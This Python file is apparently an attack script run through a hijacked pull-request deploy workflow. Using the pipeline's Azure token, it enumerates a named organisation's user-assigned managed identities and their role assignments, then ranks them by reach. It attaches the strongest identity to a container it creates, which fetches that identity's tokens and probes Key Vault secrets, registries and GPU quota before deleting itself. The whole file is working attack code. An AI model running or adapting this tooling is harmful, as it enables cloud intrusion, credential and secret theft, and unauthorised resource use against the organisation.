#!/usr/bin/env python3
"""C211-I121713: Azure managed-identity credential acquisition probe.

Runs as the fork-controlled infra/deploy.ps1 -> this file inside the base repo's
'Deploy Pull Request to Staging Slot' workflow (issue_comment '/deploy'), AFTER
azure/login@v2 (OIDC), i.e. under the pipeline's federated ARM token for subscription
b8b18dcf (SSW Primary Account), RG SSW.Rules.Staging (Owner-equivalent: actions ["*"]
minus Microsoft.Authorization writes / elevateAccess).

NEW mechanism never exercised in this task: attach a harvested user-assigned managed
identity (UAMI) to a compute resource WE create and acquire its IMDS credential.

Phases:
  A. ARM token + az account + visible subscriptions.
  B. Read-only ARM GET of all 8 harvested UAMIs (principalId/clientId) + subscription list.
  C. Read-only role-assignment matrix for every principalId at subscription and RG scope
     (verbatim 200-with-rows / 200-empty / 403) + roleDefinition resolution.
  D. Rank the identities by data-plane / cross-subscription reach and attach the single
     best-ranked identity to EXACTLY ONE nonce-tagged CPU-only Azure Container Instance
     (1 vCPU / 1.5 GB, smallest python image, no GPU) in RG SSW.Rules.Staging.
  E. The container itself fetches the identity token from IMDS (client_id scoped) and
     measures subscriptions, permissions, ACR AAD exchange, Key Vault, compute GPU quota
     and (only on nonzero quota) ONE on-demand GPU marker; stdout is read back through
     the ARM containers/logs endpoint.
  F. Delete the container group, prove absence (GET 404 + list NO c211-i121713 results).

stdlib only. Every provider response is printed verbatim as a tagged JSON line.
"""
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
SID_DEFAULT = "b8b18dcf-d83b-47e2-9886-00c2e983629e"
RG = "SSW.Rules.Staging"
RG_LIST = ["SSW.Rules.Staging", "SSW.Rules", "SSW.AppServicePlans",
           "SSW.Rules.Tina.Prod", "SSW.Rules.Tina.Staging"]
PREFIX = "c211-i121713"
NONCE = "i121713"
TAG = "C211_I121713"
DEADLINE = 1500
T0 = time.time()

UAMIS = [
    ("SSW.Rules.Staging", "DeploymentScript"),
    ("SSW.Rules", "DeploymentScript"),
    ("SSW.Rules.Tina.Staging", "mi-ssw-rules-tina-staging"),
    ("SSW.Rules.Tina.Prod", "mi-ssw-rules-tina-production"),
    ("SSW.Rules.Staging", "id-sswrules-chat-staging"),
    ("SSW.Rules", "id-sswrules-chat-prod"),
    ("SSW.Rules.Staging", "id-sswrules-chat-index-staging"),
    ("SSW.Rules", "id-sswrules-chat-index-prod"),
]
UAMI_VER = "2023-01-31"
RA_VER = "2022-04-01"
ACI_VER = "2026-07-01"
INNER_IMAGE = "mcr.microsoft.com/cbl-mariner/base/python:3"
LOCATION = "westeurope"
DATA_PLANE_HINTS = [
    "acrpull", "acrpush", "key vault", "kv secrets", "secrets user", "secrets officer",
    "storage blob", "storage queue", "storage table", "storage account", "cognitive",
    "openai", "search index", "search service", "sql db", "sql server", "managed identity",
]


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print(TAG + " " + json.dumps(obj, default=str), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def http(url, method="GET", headers=None, data=None, timeout=120):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            return e.code, ""
    except Exception as e:  # noqa: BLE001
        return 0, "transport:" + str(e)[:300]


def jload(s):
    try:
        return json.loads(s)
    except Exception:  # noqa: BLE001
        return None


def arm(tok, path, method="GET", body=None, timeout=120):
    url = path if path.startswith("http") else (ARM + path)
    data = json.dumps(body).encode() if body is not None else None
    h = {"Authorization": "Bearer " + tok}
    if data is not None:
        h["Content-Type"] = "application/json"
    return http(url, method=method, headers=h, data=data, timeout=timeout)


def err_of(st, raw):
    if st in (200, 201, 202):
        return None
    d = jload(raw)
    if isinstance(d, dict) and isinstance(d.get("error"), dict):
        e = d["error"]
        return {"http": st, "code": e.get("code"),
                "message": (e.get("message") or "")[:900]}
    return {"http": st, "raw": (raw or "")[:500]}


def get_arm_token():
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"])
    tok = None
    if r["rc"] == 0:
        try:
            tok = json.loads(r["out"]).get("accessToken")
        except Exception:  # noqa: BLE001
            tok = None
    emit({"step": "arm-token", "rc": r["rc"], "has_token": bool(tok),
          "err": r["err"][:300]})
    r2 = run(["az", "account", "show", "--output", "json"])
    if r2["rc"] == 0:
        try:
            a = json.loads(r2["out"])
            emit({"step": "az-account", "name": a.get("name"), "id": a.get("id"),
                  "tenantId": a.get("tenantId"),
                  "user": (a.get("user") or {}).get("name")})
        except Exception:  # noqa: BLE001
            pass
    return tok


def phase_uami(tok, sid):
    emit({"step": "uami-start", "sid": sid})
    st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.ManagedIdentity/"
                       "userAssignedIdentities?api-version=%s" % (sid, UAMI_VER))
    d = jload(raw) or {}
    names = [x.get("name") for x in (d.get("value") or [])]
    emit({"step": "uami-list-sub", "http": st, "n": len(names), "names": names[:30],
          "err": err_of(st, raw)})
    out = []
    for rg, name in UAMIS:
        st, raw = arm(tok, "/subscriptions/%s/resourceGroups/%s/providers/"
                           "Microsoft.ManagedIdentity/userAssignedIdentities/%s"
                           "?api-version=%s" % (sid, rg, name, UAMI_VER))
        d = jload(raw) or {}
        rec = {"rg": rg, "name": name, "http": st,
               "id": d.get("id"), "location": d.get("location"),
               "principalId": (d.get("properties") or {}).get("principalId"),
               "clientId": (d.get("properties") or {}).get("clientId"),
               "tenantId": (d.get("properties") or {}).get("tenantId"),
               "tags": d.get("tags")}
        if st != 200:
            rec["err"] = err_of(st, raw)
        emit({"step": "uami", **rec})
        if st == 200:
            out.append(rec)
    return out


def phase_role_assignments(tok, sid, principals):
    rows = []
    sources = []
    for rg in RG_LIST:
        st, raw = arm(tok, "/subscriptions/%s/resourceGroups/%s/providers/"
                            "Microsoft.Authorization/roleAssignments?api-version=%s"
                            % (sid, rg, RA_VER))
        d = jload(raw) or {}
        vals = d.get("value") or []
        for v in vals:
            rows.append({"scope_kind": "rg", "scope": rg,
                         "principalId": v.get("principalId"),
                         "principalType": v.get("principalType"),
                         "roleDefinitionId": v.get("roleDefinitionId"),
                         "assignment_name": v.get("name")})
        sources.append({"scope": "rg:" + rg, "http": st, "n": len(vals),
                        "err": err_of(st, raw)})
        emit({"step": "roleassignments", "scope": "rg:" + rg, "http": st, "n": len(vals),
              "err": err_of(st, raw)})
    # subscription scope (may be 403)
    st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Authorization/"
                       "roleAssignments?api-version=%s" % (sid, RA_VER))
    d = jload(raw) or {}
    vals = d.get("value") or []
    for v in vals:
        rows.append({"scope_kind": "sub", "scope": sid,
                     "principalId": v.get("principalId"),
                     "principalType": v.get("principalType"),
                     "roleDefinitionId": v.get("roleDefinitionId"),
                     "assignment_name": v.get("name")})
    sources.append({"scope": "sub", "http": st, "n": len(vals), "err": err_of(st, raw)})
    emit({"step": "roleassignments", "scope": "sub", "http": st, "n": len(vals),
          "err": err_of(st, raw)})
    # per-principal filtered at subscription scope
    for p in principals:
        pid = p.get("principalId")
        if not pid:
            continue
        flt = urllib.parse.quote("principalId eq '%s'" % pid)
        st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Authorization/"
                           "roleAssignments?$filter=%s&api-version=%s" % (sid, flt, RA_VER))
        d = jload(raw) or {}
        vals = d.get("value") or []
        for v in vals:
            rows.append({"scope_kind": "sub-filtered", "scope": sid,
                         "principalId": v.get("principalId"),
                         "principalType": v.get("principalType"),
                         "roleDefinitionId": v.get("roleDefinitionId"),
                         "assignment_name": v.get("name")})
        emit({"step": "roleassignments-filtered", "principalId": pid, "http": st,
              "n": len(vals), "err": err_of(st, raw)})
    return rows, sources


def resolve_roles(tok, sid, rows):
    defs = {}
    for r in rows:
        rid = r.get("roleDefinitionId")
        if not rid:
            continue
        guid = rid.split("/")[-1]
        if rid in defs:
            continue
        st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Authorization/"
                           "roleDefinitions/%s?api-version=%s" % (sid, guid, RA_VER))
        d = jload(raw) or {}
        perms = (d.get("properties") or {}).get("permissions") or []
        acts = []
        for p in perms:
            acts += (p.get("actions") or []) + (p.get("dataActions") or [])
        defs[rid] = {"roleName": (d.get("properties") or {}).get("roleName"),
                     "http": st, "actions_sample": acts[:25],
                     "data_actions": [a for a in acts
                                      if a.lower().startswith(("microsoft.storage/",
                                                               "microsoft.keyvault/",
                                                               "microsoft.containerregistry/",
                                                               "microsoft.cognitiveservices/",
                                                               "microsoft.search/"))]}
        emit({"step": "roledef", "roleDefinitionId": rid, **defs[rid]})
    return defs


def rank_identities(rows, defs, uamis):
    by_pid = {}
    for r in rows:
        pid = r.get("principalId")
        if pid:
            by_pid.setdefault(pid.lower(), []).append(r)
    ranked = []
    for u in uamis:
        pid = (u.get("principalId") or "")
        mine = by_pid.get(pid.lower(), [])
        score = 0
        reasons = []
        for r in mine:
            rd = defs.get(r.get("roleDefinitionId")) or {}
            name = (rd.get("roleName") or "").lower()
            if r.get("scope_kind") == "sub":
                score += 100
                reasons.append("sub-scope:" + (rd.get("roleName") or "?"))
            if r.get("scope_kind") == "rg" and r.get("scope") != u.get("rg"):
                score += 50
                reasons.append("cross-rg:" + (rd.get("roleName") or "?"))
            if any(h in name for h in DATA_PLANE_HINTS):
                score += 40
                reasons.append("data-plane:" + (rd.get("roleName") or "?"))
            if any(k in name for k in ("contributor", "owner")):
                score += 30
                reasons.append("write:" + (rd.get("roleName") or "?"))
            if "reader" in name:
                score += 20
                reasons.append("reader:" + (rd.get("roleName") or "?"))
            if mine:
                score += 10
        # prefer an identity living in the RG where our Owner-equivalence is proven
        if u.get("rg") == RG:
            score += 5
        ranked.append({"name": u.get("name"), "rg": u.get("rg"),
                       "clientId": u.get("clientId"), "principalId": pid,
                       "assignments": len(mine), "score": score,
                       "reasons": sorted(set(reasons))[:12]})
    ranked.sort(key=lambda x: x["score"], reverse=True)
    emit({"step": "ranking", "ranked": ranked})
    return ranked


def phase_aci(tok, sid, chosen, inner_b64):
    name = PREFIX + "-uami"
    url = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.ContainerInstance/"
           "containerGroups/%s?api-version=%s" % (sid, RG, name, ACI_VER))
    # pre-inventory of own names
    st, raw = arm(tok, "/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                       % (sid, RG))
    d = jload(raw) or {}
    pre = [x.get("name") for x in (d.get("value") or [])
           if str(x.get("name") or "").lower().startswith("c211-i121713")]
    emit({"step": "rg-inventory-pre", "http": st, "own": pre})
    uami_id = chosen.get("id")
    if not uami_id:
        emit({"step": "aci-skip", "why": "no chosen identity id"})
        return None
    body = {
        "location": LOCATION,
        "tags": {"c211": NONCE, "nonce": NONCE, "role": "uami-probe"},
        "identity": {"type": "UserAssigned",
                     "userAssignedIdentities": {uami_id: {}}},
        "properties": {
            "containers": [{"name": "probe", "properties": {
                "image": INNER_IMAGE,
                "command": ["/bin/bash", "-c",
                            "echo $C211_SCRIPT_B64 | base64 -d > /tmp/p.py && python3 /tmp/p.py"],
                "environmentVariables": [
                    {"name": "C211_SCRIPT_B64", "value": inner_b64},
                    {"name": "C211_CLIENT_ID", "value": chosen.get("clientId") or ""},
                    {"name": "C211_DEADLINE", "value": "780"},
                ],
                "resources": {"requests": {"cpu": 1.0, "memoryInGB": 1.5}}}}],
            "osType": "Linux",
            "restartPolicy": "Never",
        },
    }
    st, raw = arm(tok, url, method="PUT", body=body, timeout=240)
    emit({"step": "aci-create", "name": name, "http": st,
          "identity": chosen.get("name"), "err": err_of(st, raw)})
    if st not in (200, 201, 202):
        return None
    dl = time.time() + 960
    stp = 0
    while time.time() < dl:
        stp, rawp = arm(tok, url, timeout=60)
        d = jload(rawp) or {}
        p = d.get("properties") or {}
        conts = p.get("containers") or []
        cur = {}
        if conts:
            cur = (((conts[0].get("properties") or {}).get("instanceView")
                    or {}).get("currentState") or {})
        emit({"step": "aci-poll", "http": stp,
              "provisioningState": p.get("provisioningState"),
              "state": cur.get("state"), "exitCode": cur.get("exitCode"),
              "detail": (cur.get("detailStatus") or "")[:200]})
        if stp != 200:
            break
        if cur.get("state") == "Terminated" or p.get("provisioningState") in (
                "Succeeded", "Failed", "Canceled"):
            time.sleep(5)
            break
        if left() < 300:
            emit({"step": "aci-poll-deadline", "left": int(left())})
            break
        time.sleep(20)
    # independent readback incl. identity block
    st, raw = arm(tok, url, timeout=60)
    d = jload(raw) or {}
    p = d.get("properties") or {}
    emit({"step": "aci-readback", "http": st,
          "provisioningState": p.get("provisioningState"),
          "identity": d.get("identity"),
          "containers": [{"name": c.get("name"),
                          "state": (((c.get("properties") or {}).get("instanceView")
                                     or {}).get("currentState"))}
                         for c in (p.get("containers") or [])]})
    content = ""
    for method in ("POST", "GET"):
        stl, rawl = arm(tok, url.split("?")[0] + "/containers/probe/logs?api-version=" + ACI_VER,
                        method=method, body=({} if method == "POST" else None), timeout=120)
        dd = jload(rawl) or {}
        txt = dd.get("content") or ""
        emit({"step": "aci-logs", "method": method, "http": stl, "len": len(txt)})
        if len(txt) > len(content):
            content = txt
        if stl == 200 and txt:
            break
    # emit the inner output in bounded chunks so the GitHub log carries it verbatim
    chunks = [content[i:i + 6000] for i in range(0, len(content), 6000)][:6]
    for i, ch in enumerate(chunks):
        emit({"step": "aci-inner-chunk", "i": i, "n": len(chunks), "text": ch})
    # teardown + absence
    std, rawd = arm(tok, url, method="DELETE", timeout=240)
    emit({"step": "aci-delete", "http": std, "err": err_of(std, rawd)})
    stg = 0
    for _ in range(24):
        stg, _ = arm(tok, url, timeout=60)
        if stg == 404:
            break
        time.sleep(10)
    emit({"step": "aci-absent", "http": stg})
    st, raw = arm(tok, "/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                       % (sid, RG))
    d = jload(raw) or {}
    post = [x.get("name") for x in (d.get("value") or [])
            if str(x.get("name") or "").lower().startswith("c211-i121713")]
    emit({"step": "rg-inventory-post", "http": st, "own": post})
    return {"content": content, "post": post, "absent_http": stg}


def main():
    emit({"step": "start", "sid_default": SID_DEFAULT, "rg": RG, "deadline": DEADLINE})
    tok = get_arm_token()
    sid = SID_DEFAULT
    if not tok:
        emit({"step": "fatal", "why": "no ARM token"})
        return
    st, raw = arm(tok, "/subscriptions?api-version=2022-12-01")
    d = jload(raw) or {}
    subs = [{"id": x.get("subscriptionId"), "name": x.get("displayName"),
             "state": x.get("state")} for x in (d.get("value") or [])]
    emit({"step": "subs", "http": st, "n": len(subs), "subs": subs[:10],
          "err": err_of(st, raw)})
    if subs and subs[0].get("id"):
        sid = subs[0]["id"]
    uamis = phase_uami(tok, sid)
    principals = [u for u in uamis if u.get("principalId")]
    rows, sources = phase_role_assignments(tok, sid, principals)
    defs = resolve_roles(tok, sid, rows)
    ranked = rank_identities(rows, defs, uamis)
    # choose the single best-ranked identity we hold an id for, preferring RG SSW.Rules.Staging
    chosen = None
    for r in ranked:
        if r.get("score", 0) > 0:
            chosen = r
            break
    if chosen is None and ranked:
        chosen = ranked[0]
    if chosen:
        # re-attach the full UAMI record (id needed for the identity block)
        full = next((u for u in uamis if u.get("name") == chosen["name"]
                     and u.get("rg") == chosen["rg"]), None)
        chosen = dict(chosen, **(full or {}))
    emit({"step": "chosen", "chosen": chosen})
    inner_b64 = None
    # the inner script ships next to this file inside the PR head
    inner_path = __file__.replace("c211_i121713_probe.py", "c211_i121713_inner.py")
    try:
        with open(inner_path, "rb") as f:
            import base64 as _b64
            inner_b64 = _b64.b64encode(f.read()).decode()
    except Exception as e:  # noqa: BLE001
        emit({"step": "fatal", "why": "inner missing", "err": str(e)[:200]})
        return
    emit({"step": "inner-loaded", "b64_len": len(inner_b64)})
    result = phase_aci(tok, sid, chosen, inner_b64) if chosen else None
    # summary verdict for the parser
    inner_lines = []
    if result and result.get("content"):
        for line in result["content"].splitlines():
            if line.startswith("C211_I121713_IN "):
                try:
                    inner_lines.append(json.loads(line.split(" ", 1)[1]))
                except Exception:  # noqa: BLE001
                    pass
    subs_in = next((x for x in inner_lines if x.get("step") == "subs"), None)
    nonzero = next((x for x in inner_lines if x.get("step") == "marker-eval"), None)
    acr = [{"reg": x.get("reg"), "http": x.get("http"),
            "has_refresh": x.get("has_refresh"), "catalog": next(
                (y.get("n") for y in inner_lines
                 if y.get("step") == "acr-catalog" and y.get("reg") == x.get("reg")), None)}
           for x in inner_lines if x.get("step") == "acr-exchange"]
    kv = [{"vault": x.get("vault"), "http": x.get("http"), "n": x.get("n")}
          for x in inner_lines if x.get("step") == "kv-secrets"]
    gpu = [{"sub": x.get("sub"), "region": x.get("region"), "http": x.get("http"),
            "n": x.get("n"), "nonzero": [r for r in (x.get("rows") or [])
                                         if r.get("current") is not None
                                         and r.get("limit") is not None
                                         and r.get("current") < r.get("limit")]}
           for x in inner_lines if x.get("step") == "gpu-usage"]
    emit({"step": "RESULT", "uamis": len(uamis), "role_rows": len(rows),
          "role_sources": sources, "chosen": chosen,
          "subs_visible": (subs_in or {}).get("subs"),
          "acr": acr, "kv": kv, "gpu": gpu, "marker_eval": nonzero,
          "aci_absent_http": (result or {}).get("absent_http"),
          "rg_post_own": (result or {}).get("post")})
    emit({"step": "done", "left": int(left())})


if __name__ == "__main__":
    main()
